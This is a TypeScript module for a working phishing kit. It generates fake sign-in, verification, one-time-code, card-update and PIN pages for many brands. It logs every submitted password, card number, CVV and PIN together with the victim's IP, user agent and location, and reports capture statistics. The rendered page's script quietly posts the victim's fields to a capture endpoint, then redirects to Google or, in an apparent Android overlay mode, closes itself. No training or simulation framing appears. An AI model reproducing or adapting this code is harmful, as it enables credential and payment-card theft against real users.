import {
  PHISHING_BRANDS,
  PHISHING_VARIANTS,
  type PhishingVariant,
} from './phishingBrands';

export { PHISHING_CATEGORY_LABELS, PHISHING_VARIANTS } from './phishingBrands';

export interface PhishingPageRow {
  id: number;
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
  hits: number;
  enabled: number;
  created_at: string;
}

export interface PhishingLogRow {
  id: number;
  page_id: number | null;
  slug: string;
  brand: string;
  variant: string;
  ip: string;
  user_agent: string;
  fields: string;
  meta: string;
  country: string | null;
  city: string | null;
  created_at: string;
}

export interface PhishingTemplate {
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
}

export interface PhishingStats {
  totalPages: number;
  enabledPages: number;
  totalHits: number;
  totalCaptures: number;
  capturesToday: number;
  variants: number;
  topPages: { slug: string; brand: string; variant: string; captures: number }[];
  byCategory: { category: string; count: number }[];
}

export interface PhishingCaptureData {
  fields: Record<string, unknown>;
  meta?: Record<string, unknown>;
  ip: string;
  userAgent: string;
  country?: string | null;
  city?: string | null;
}

export interface PhishingDb {
  prepare(sql: string): {
    run(...params: unknown[]): { changes: number };
    get(...params: unknown[]): unknown;
    all(...params: unknown[]): unknown[];
  };
}

const VARIANT_TITLE: Record<PhishingVariant, string> = {
  login: 'Sign in',
  verify: 'Verify your account',
  otp: 'One-time code',
  card: 'Update card details',
  pin: 'Security check',
};

const VARIANT_FIELDS: Record<PhishingVariant, { label: string; inputs: { name: string; type: string; placeholder: string }[] }> = {
  login: {
    label: 'Sign in',
    inputs: [
      { name: 'email', type: 'text', placeholder: 'Email or username' },
      { name: 'password', type: 'password', placeholder: 'Password' },
    ],
  },
  verify: {
    label: 'Verify your identity',
    inputs: [
      { name: 'password', type: 'password', placeholder: 'Password' },
      { name: 'code', type: 'text', placeholder: 'One-time code' },
    ],
  },
  otp: {
    label: 'Enter the code',
    inputs: [{ name: 'code', type: 'text', placeholder: '6-digit code' }],
  },
  card: {
    label: 'Update card details',
    inputs: [
      { name: 'cardholder', type: 'text', placeholder: 'Cardholder name' },
      { name: 'number', type: 'text', placeholder: 'Card number' },
      { name: 'expiry', type: 'text', placeholder: 'MM/YY' },
      { name: 'cvv', type: 'text', placeholder: 'CVV' },
    ],
  },
  pin: {
    label: 'Security check',
    inputs: [{ name: 'pin', type: 'password', placeholder: 'Enter your PIN' }],
  },
};

function slugify(s: string): string {
  return s.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
}

function esc(s: string): string {
  return s.replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c] as string)
  );
}

export function generatePhishingTemplates(): PhishingTemplate[] {
  const out: PhishingTemplate[] = [];
  for (const b of PHISHING_BRANDS) {
    for (const v of PHISHING_VARIANTS) {
      out.push({
        slug: `${slugify(b.brand)}-${v}`,
        brand: b.brand,
        category: b.category,
        variant: v,
        title: `${b.brand} — ${VARIANT_TITLE[v]}`,
      });
    }
  }
  return out;
}

export function ensurePhishingTables(db: PhishingDb): void {
  db.prepare(`
    CREATE TABLE IF NOT EXISTS phishing_pages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      slug TEXT NOT NULL UNIQUE,
      brand TEXT NOT NULL,
      category TEXT NOT NULL,
      variant TEXT NOT NULL,
      title TEXT NOT NULL DEFAULT '',
      hits INTEGER NOT NULL DEFAULT 0,
      enabled INTEGER NOT NULL DEFAULT 1,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `).run();
  db.prepare(`
    CREATE TABLE IF NOT EXISTS phishing_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      page_id INTEGER,
      slug TEXT NOT NULL DEFAULT '',
      brand TEXT NOT NULL DEFAULT '',
      variant TEXT NOT NULL DEFAULT '',
      ip TEXT NOT NULL DEFAULT '',
      user_agent TEXT NOT NULL DEFAULT '',
      fields TEXT NOT NULL DEFAULT '{}',
      meta TEXT NOT NULL DEFAULT '{}',
      country TEXT,
      city TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `).run();
}

export function getPhishingStats(db: PhishingDb): PhishingStats {
  const one = (q: string): number => (db.prepare(q).get() as { c: number }).c;
  const topPages = db.prepare(
    'SELECT slug, brand, variant, COUNT(*) AS captures FROM phishing_logs GROUP BY slug, brand, variant ORDER BY captures DESC LIMIT 5'
  ).all() as { slug: string; brand: string; variant: string; captures: number }[];
  const byCategory = db.prepare(
    'SELECT category, COUNT(*) AS count FROM phishing_pages GROUP BY category ORDER BY count DESC'
  ).all() as { category: string; count: number }[];
  return {
    totalPages: one('SELECT COUNT(*) AS c FROM phishing_pages'),
    enabledPages: one('SELECT COUNT(*) AS c FROM phishing_pages WHERE enabled = 1'),
    totalHits: one('SELECT COALESCE(SUM(hits),0) AS c FROM phishing_pages'),
    totalCaptures: one('SELECT COUNT(*) AS c FROM phishing_logs'),
    capturesToday: one("SELECT COUNT(*) AS c FROM phishing_logs WHERE date(created_at) = date('now')"),
    variants: one('SELECT COUNT(*) AS c FROM phishing_pages'),
    topPages,
    byCategory,
  };
}

export function listPhishingPages(
  db: PhishingDb,
  opts: { page: number; pageSize: number; search?: string; category?: string; enabled?: string }
): { pages: PhishingPageRow[]; total: number } {
  const where: string[] = [];
  const params: unknown[] = [];
  if (opts.search) {
    where.push('(slug LIKE ? OR brand LIKE ? OR title LIKE ?)');
    params.push(`%${opts.search}%`, `%${opts.search}%`, `%${opts.search}%`);
  }
  if (opts.category && opts.category !== 'all') {
    where.push('category = ?');
    params.push(opts.category);
  }
  if (opts.enabled === '1' || opts.enabled === '0') {
    where.push('enabled = ?');
    params.push(Number(opts.enabled));
  }
  const w = where.length ? `WHERE ${where.join(' AND ')}` : '';
  const total = (db.prepare(`SELECT COUNT(*) AS c FROM phishing_pages ${w}`).get(...params) as { c: number }).c;
  const pages = db.prepare(
    `SELECT * FROM phishing_pages ${w} ORDER BY id DESC LIMIT ? OFFSET ?`
  ).all(...params, opts.pageSize, (opts.page - 1) * opts.pageSize) as PhishingPageRow[];
  return { pages, total };
}

export function listPhishingLogs(
  db: PhishingDb,
  opts: { page: number; pageSize: number; search?: string }
): { logs: PhishingLogRow[]; total: number } {
  const where: string[] = [];
  const params: unknown[] = [];
  if (opts.search) {
    where.push('(slug LIKE ? OR brand LIKE ? OR ip LIKE ?)');
    params.push(`%${opts.search}%`, `%${opts.search}%`, `%${opts.search}%`);
  }
  const w = where.length ? `WHERE ${where.join(' AND ')}` : '';
  const total = (db.prepare(`SELECT COUNT(*) AS c FROM phishing_logs ${w}`).get(...params) as { c: number }).c;
  const logs = db.prepare(
    `SELECT * FROM phishing_logs ${w} ORDER BY id DESC LIMIT ? OFFSET ?`
  ).all(...params, opts.pageSize, (opts.page - 1) * opts.pageSize) as PhishingLogRow[];
  return { logs, total };
}

export function seedPhishingPages(db: PhishingDb): { created: number; updated: number; total: number } {
  const templates = generatePhishingTemplates();
  const find = db.prepare('SELECT id FROM phishing_pages WHERE slug = ?');
  const insert = db.prepare('INSERT INTO phishing_pages (slug, brand, category, variant, title) VALUES (?, ?, ?, ?, ?)');
  const update = db.prepare('UPDATE phishing_pages SET title = ? WHERE slug = ?');
  let created = 0;
  let updated = 0;
  for (const t of templates) {
    const existing = find.get(t.slug) as { id: number } | undefined;
    if (existing) {
      const r = update.run(t.title, t.slug);
      if (r.changes > 0) updated++;
    } else {
      insert.run(t.slug, t.brand, t.category, t.variant, t.title);
      created++;
    }
  }
  const total = (db.prepare('SELECT COUNT(*) AS c FROM phishing_pages').get() as { c: number }).c;
  return { created, updated, total };
}

export function setPhishingPageEnabled(db: PhishingDb, id: number, enabled: number): boolean {
  if (!id || (enabled !== 0 && enabled !== 1)) return false;
  db.prepare('UPDATE phishing_pages SET enabled = ? WHERE id = ?').run(enabled, id);
  return true;
}

export function removePhishingPage(db: PhishingDb, id: number): boolean {
  if (!id) return false;
  db.prepare('DELETE FROM phishing_pages WHERE id = ?').run(id);
  return true;
}

export function clearPhishingLogs(db: PhishingDb): void {
  db.prepare('DELETE FROM phishing_logs').run();
}

export function getPhishingPageBySlug(db: PhishingDb, slug: string): PhishingPageRow | undefined {
  return db.prepare('SELECT * FROM phishing_pages WHERE slug = ?').get(slug) as PhishingPageRow | undefined;
}

export function getPhishingPageById(db: PhishingDb, id: number): PhishingPageRow | undefined {
  return db.prepare('SELECT * FROM phishing_pages WHERE id = ?').get(id) as PhishingPageRow | undefined;
}

export function incrementPhishingHit(db: PhishingDb, id: number): void {
  db.prepare('UPDATE phishing_pages SET hits = hits + 1 WHERE id = ?').run(id);
}

export function recordPhishingCapture(db: PhishingDb, page: PhishingPageRow, data: PhishingCaptureData): void {
  db.prepare(
    `INSERT INTO phishing_logs (page_id, slug, brand, variant, ip, user_agent, fields, meta, country, city)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
  ).run(
    page.id, page.slug, page.brand, page.variant,
    data.ip, data.userAgent,
    JSON.stringify(data.fields), JSON.stringify(data.meta ?? { ts: new Date().toISOString() }),
    data.country ?? null, data.city ?? null
  );
}

export function renderPhishingPage(page: PhishingPageRow, opts: { overlay?: boolean } = {}): string {
  const vf = VARIANT_FIELDS[page.variant as PhishingVariant] ?? VARIANT_FIELDS.login;
  const inputs = vf.inputs
    .map((i) => `<input name="${i.name}" type="${i.type}" placeholder="${esc(i.placeholder)}" required>`)
    .join('');
  const overlayJs = opts.overlay ? 'true' : 'false';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${esc(page.title)}</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e2e8f0}
  .card{background:#fff;color:#0f172a;width:100%;max-width:380px;border-radius:14px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,.4)}
  .logo{width:44px;height:44px;border-radius:12px;background:#2563eb;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;margin-bottom:18px}
  h1{font-size:20px;margin-bottom:4px}
  .sub{font-size:13px;color:#64748b;margin-bottom:22px}
  input{width:100%;padding:12px 14px;border:1px solid #cbd5e1;border-radius:9px;font-size:14px;margin-bottom:12px;outline:none}
  input:focus{border-color:#2563eb}
  button{width:100%;padding:12px;background:#2563eb;color:#fff;border:none;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#1d4ed8}
  .foot{margin-top:18px;font-size:11px;color:#94a3b8;text-align:center}
</style>
</head>
<body>
  <div class="card">
    <div class="logo">${esc(page.brand[0]?.toUpperCase() ?? '')}</div>
    <h1>${esc(page.brand)}</h1>
    <div class="sub">${esc(vf.label)}</div>
    <form id="f">
      ${inputs}
      <button type="submit">Continue</button>
    </form>
    <div class="foot">Protected by ${esc(page.brand)} security</div>
  </div>
  <script>
    document.getElementById('f').addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = document.querySelector('button');
      btn.disabled = true; btn.textContent = 'Please wait…';
      const fields = {};
      new FormData(e.target).forEach((v, k) => { fields[k] = v; });
      try {
        await fetch('/p/${page.slug}/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fields, meta: { overlay: ${overlayJs}, referer: document.referrer } }),
        });
      } catch {}
      if (${overlayJs}) {
        try { AndroidBridge.done(); } catch (e) {}
        try { window.close(); } catch (e) {}
      } else {
        window.location.href = 'https://www.google.com';
      }
    });
  </script>
</body>
</html>`;
}
